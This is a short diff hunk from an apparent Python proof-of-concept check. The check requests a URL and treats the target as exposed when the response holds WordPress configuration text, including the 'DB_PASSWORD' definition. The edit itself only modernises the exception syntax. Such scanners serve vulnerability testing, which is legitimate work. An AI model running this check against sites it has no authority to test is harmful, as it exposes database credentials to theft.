@@ -27,6 +27,6 @@ def poc(url):
         r = urllib2.urlopen(target, timeout=5).read()  # cannot use requests here
         if "define('DB_PASSWORD'" in r and '@package WordPress' in r:
             return target
-    except Exception, e:
+    except Exception as e:
         pass
     return False
